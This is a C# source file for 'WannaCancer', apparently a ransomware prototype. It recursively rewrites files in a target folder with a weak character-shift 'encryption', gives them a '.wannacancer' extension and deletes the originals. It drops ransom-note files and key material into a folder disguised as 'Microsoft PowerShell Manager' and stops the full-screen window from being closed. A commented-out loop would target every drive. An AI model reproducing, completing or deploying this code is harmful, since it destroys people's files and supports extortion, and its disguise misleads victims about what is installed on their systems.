using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace WannaCancer3._0
{
    public partial class WannaCancer : Form
    {
        Random rand = new Random();
        Thread encrypt;
        private int keygen;
        private string decryptID;
        public WannaCancer()
        {
            InitializeComponent();
            MakeFullScreen();

            encrypt = new Thread(StartEncrypt);
            encrypt.Start();


        }

        private void MakeFullScreen()
        {
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        }

        private void StartEncrypt()
        {
            keygen = rand.Next(10);
            decryptID = GenerateDecryptID();
            File.Create(@"C:\Files\test.dll");
            DriveInfo[] drive = DriveInfo.GetDrives();

            //foreach (DriveInfo item in drive)
            //{
            //    Encrypt(item.Name);
            //}

            Encrypt(@"C:\Files\Test\");
            Extract();

            Thread.Sleep(60000);
            Environment.Exit(0);

        }

        private string GenerateDecryptID()
        {
            string result = "";
            for (int i = 0; i < 25; i++)
            {
                result += (char)rand.Next(32,126);
            }
            return result;
        }

        private void Extract()
        {
            Directory.CreateDirectory(@"C:\Program Files\Microsoft PowerShell Manager\");
            FileStream VN = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\VI.txt", FileMode.Create, FileAccess.Write);
            FileStream EN = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\EN.txt", FileMode.Create, FileAccess.Write);
            FileStream JP = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", FileMode.Create, FileAccess.Write);
            FileStream BG = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\BG.png", FileMode.Create, FileAccess.Write);
            FileStream keyGen = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\shell.exe", FileMode.Create);
            FileStream decryptID = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\manager.exe", FileMode.Create);

            byte[] vi = Encoding.Unicode.GetBytes(Properties.Resources.VI);
            byte[] en = Encoding.Default.GetBytes(Properties.Resources.EN);
            byte[] jp = Encoding.Unicode.GetBytes(Properties.Resources.JP);
            byte[] keygen = Encoding.Default.GetBytes(this.keygen.ToString());
            byte[] decryptid = Encoding.Default.GetBytes(this.decryptID);
            //Image -> byte
            ImageConverter imageConverter = new ImageConverter();
            byte[] bg = (byte[])imageConverter.ConvertTo(Properties.Resources.WallPaper, typeof(byte[]));

            //Write Stream
            VN.Write(vi, 0, vi.Length);
            EN.Write(en, 0, en.Length);
            JP.Write(jp, 0, jp.Length);
            BG.Write(bg, 0, bg.Length);
            keyGen.Write(keygen, 0, keygen.Length);
            decryptID.Write(decryptid, 0, decryptid.Length);

            //Close Stream and release resources used by the stream
            VN.Close();
            EN.Close();
            JP.Close();
            BG.Close();
            keyGen.Close();
            decryptID.Close();

        }

        private void Encrypt(string path)
        {
            string[] directories = Directory.GetDirectories(path);
            string[] files = Directory.GetFiles(path);

            foreach (string item in files)
            {
                FileInfo file = new FileInfo(item);
                string fe = file.Extension;
                EncryptFile(item);
            }

            foreach (string item in directories)
            {
                Encrypt(item);
            }
        }

        private void EncryptFile(string path)
        {
            try
            {
                FileStream fs = new FileStream(path, FileMode.Open);
                byte[] orginal = new byte[fs.Length];

                for (int i = 0; i < fs.Length; i++)
                {
                    orginal[i] = (byte)fs.ReadByte();
                }

                char[] charSet = new char[orginal.Length];

                charSet = Encoding.Default.GetChars(orginal);

                for (int i = 0; i < fs.Length; i++)
                {
                    charSet[i] += (char)keygen;
                }

                byte[] encrypt = new byte[fs.Length];
                encrypt = Encoding.Default.GetBytes(charSet);
                fs.Close();

                FileStream fsEncrypt = new FileStream(path + ".wannacancer", FileMode.Create);
                fsEncrypt.Write(encrypt, 0, encrypt.Length);
                fsEncrypt.Close();
                File.Delete(path);
            }
            catch
            {
                return;
            }
        }

        private void WannaCancer_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        //Likely will removed after testing
        private void WannaCancer_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
